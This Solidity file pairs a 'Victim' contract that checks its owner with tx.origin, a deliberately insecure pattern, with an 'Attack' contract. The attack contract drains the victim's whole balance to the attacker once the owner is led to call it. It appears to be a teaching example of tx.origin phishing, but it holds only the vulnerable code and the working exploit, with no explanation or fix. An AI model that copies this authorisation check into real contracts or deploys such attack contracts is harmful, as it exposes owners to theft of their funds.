// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Victim
 * @dev A contract that can receive Ether deposits and transfer Ether to another address.
 */
contract Victim {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    /**
     * @dev Deposits Ether into the contract.
     */
    function deposit() external payable {}

    /**
     * @dev Transfers Ether to another address.
     * @param _to The address to transfer Ether to.
     * @param _amount The amount of Ether to transfer.
     */
    function transfer(address payable _to, uint256 _amount) external payable {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    /**
     * @dev Returns the balance of the contract.
     * @return The balance of the contract.
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title Attack
 * @dev A contract that can attack the Victim contract and transfer its Ether to the attacker's address.
 */
contract Attack {
    address payable public owner;
    Victim public victim;

    constructor(address _victim) {
        victim = Victim(_victim);
        owner = payable(msg.sender);
    }

    /**
     * @dev Initiates the attack on the Victim contract and transfers its Ether to the attacker's address.
     */
    function attack() public {
        victim.transfer(owner, address(victim).balance);
    }
}
